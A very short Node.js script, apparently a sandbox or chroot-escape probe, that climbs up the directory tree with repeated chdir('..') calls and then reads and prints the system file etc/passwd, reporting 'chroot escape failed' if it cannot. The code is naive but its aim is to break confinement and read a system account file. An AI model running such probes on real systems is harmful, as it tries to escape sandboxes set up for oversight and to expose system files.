const fs = require("fs");

for (let i = 0; i < 20; i++) {
  try {
    process.chdir("..");
  } catch (e) {
    break;
  }
}

try {
  const data = fs.readFileSync("etc/passwd", "utf8");
  console.log(data);
} catch (e) {
  console.log("chroot escape failed:", e.message);
}
